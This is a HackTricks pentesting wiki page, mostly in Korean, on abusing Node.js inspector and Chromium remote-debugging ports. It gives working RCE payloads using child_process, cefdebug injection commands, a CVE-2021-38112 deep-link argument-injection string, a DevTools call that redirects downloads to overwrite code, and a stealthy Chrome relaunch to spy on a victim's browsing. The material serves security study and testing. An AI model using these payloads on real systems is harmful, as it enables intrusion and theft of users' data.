# Node inspector/CEF debug abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): `--inspect` 스위치로 시작하면, Node.js 프로세스는 디버깅 클라이언트를 위해 대기합니다. **기본적으로**, 호스트와 포트 **`127.0.0.1:9229`**에서 대기합니다. 각 프로세스는 **고유한** **UUID**도 할당받습니다.

Inspector 클라이언트는 연결하기 위해 호스트 주소, 포트 및 UUID를 알고 지정해야 합니다. 전체 URL은 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`와 비슷하게 보일 것입니다.

{% hint style="warning" %}
**디버거가 Node.js 실행 환경에 완전한 접근 권한을 가지고 있기 때문에**, 이 포트에 연결할 수 있는 악의적인 행위자는 Node.js 프로세스를 대신하여 임의의 코드를 실행할 수 있습니다 (**잠재적인 권한 상승**).
{% endhint %}

Inspector를 시작하는 방법은 여러 가지가 있습니다:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
When you start an inspected process something like this will appear:  
검사된 프로세스를 시작하면 다음과 같은 내용이 나타납니다:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processes based on **CEF** (**Chromium Embedded Framework**)는 **debugger**를 열기 위해 `--remote-debugging-port=9222` 매개변수를 사용해야 합니다 (SSRF 보호는 매우 유사하게 유지됩니다). 그러나, 그들은 **NodeJS** **debug** 세션을 부여하는 대신 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)을 사용하여 브라우저와 통신합니다. 이는 브라우저를 제어하기 위한 인터페이스이지만, 직접적인 RCE는 없습니다.

디버그된 브라우저를 시작하면 다음과 같은 것이 나타납니다:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

웹 브라우저에서 열리는 웹사이트는 브라우저 보안 모델에 따라 WebSocket 및 HTTP 요청을 할 수 있습니다. **고유한 디버거 세션 ID를 얻기 위해** **초기 HTTP 연결**이 필요합니다. **동일 출처 정책**은 웹사이트가 **이 HTTP 연결**을 만들 수 없도록 **방지**합니다. [**DNS 리바인딩 공격**](https://en.wikipedia.org/wiki/DNS\_rebinding)**에 대한 추가 보안을 위해,** Node.js는 연결의 **'Host' 헤더**가 **IP 주소** 또는 **`localhost`** 또는 **`localhost6`**를 정확히 지정하는지 확인합니다.

{% hint style="info" %}
이 **보안 조치는 HTTP 요청을 보내기만 해도** 코드를 실행하기 위해 인스펙터를 악용하는 것을 **방지합니다** (이는 SSRF 취약점을 악용하여 수행할 수 있습니다).
{% endhint %}

### Starting inspector in running processes

실행 중인 nodejs 프로세스에 **신호 SIGUSR1**을 보내면 기본 포트에서 **인스펙터를 시작**하게 할 수 있습니다. 그러나 충분한 권한이 필요하므로, 이는 **프로세스 내부의 정보에 대한 권한 있는 접근을 부여할 수 있지만** 직접적인 권한 상승은 아닙니다.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
이것은 컨테이너에서 유용합니다. 왜냐하면 `--inspect`로 **프로세스를 종료하고 새로 시작하는 것**은 **옵션이 아니기 때문**입니다. **컨테이너**는 **프로세스와 함께 종료됩니다**.
{% endhint %}

### 검사기/디버거에 연결

**Chromium 기반 브라우저**에 연결하려면 Chrome 또는 Edge에 대해 각각 `chrome://inspect` 또는 `edge://inspect` URL에 접근할 수 있습니다. 구성 버튼을 클릭하여 **대상 호스트와 포트**가 올바르게 나열되어 있는지 확인해야 합니다. 이미지는 원격 코드 실행(RCE) 예제를 보여줍니다:

![](<../../.gitbook/assets/image (674).png>)

**명령줄**을 사용하여 다음과 같이 디버거/검사기에 연결할 수 있습니다:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
도구 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)는 로컬에서 실행 중인 **검사기**를 **찾고** 그 안에 코드를 **주입**할 수 있게 해줍니다.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
**NodeJS RCE 익스플로잇은** [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)에 연결된 경우 작동하지 않습니다(흥미로운 작업을 수행하기 위해 API를 확인해야 합니다).
{% endhint %}

## NodeJS 디버거/인스펙터에서의 RCE

{% hint style="info" %}
[**Electron에서 XSS로 RCE를 얻는 방법을 찾고 있다면 이 페이지를 확인하세요.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Node **인스펙터**에 **연결**할 수 있을 때 **RCE**를 얻는 일반적인 방법은 다음과 같은 것을 사용하는 것입니다(이 **Chrome DevTools 프로토콜에 연결된 경우 작동하지 않을 것 같습니다**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In this section I will just list interesting things I find people have used to exploit this protocol.

### Parameter Injection via Deep Links

In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security discovered that an application based on CEF **registered a custom URI** in the system (workspaces://) that received the full URI and then **launched the CEF based application** with a configuration that was partially constructing from that URI.

It was discovered that the URI parameters were URL decoded and used to launch the CEF basic application, allowing a user to **inject** the flag **`--gpu-launcher`** in the **command line** and execute arbitrary things.

So, a payload like:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exe를 실행합니다.

### 파일 덮어쓰기

**다운로드된 파일이 저장될 폴더**를 변경하고, **악성 코드**로 애플리케이션의 자주 사용되는 **소스 코드**를 **덮어쓰기** 위해 파일을 다운로드합니다.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE 및 유출

이 게시물에 따르면: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCE를 얻고 내부 페이지를 유출하는 것이 가능합니다.

### 사후 활용

실제 환경에서 **Chrome/Chromium 기반 브라우저를 사용하는** 사용자 PC를 **타겟팅한 후** Chrome 프로세스를 **디버깅이 활성화된 상태로 실행하고 디버깅 포트를 포트 포워딩**하여 접근할 수 있습니다. 이렇게 하면 **희생자가 Chrome으로 수행하는 모든 작업을 검사하고 민감한 정보를 훔칠 수 있습니다**.

은밀한 방법은 **모든 Chrome 프로세스를 종료**한 다음 다음과 같은 것을 호출하는 것입니다.
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
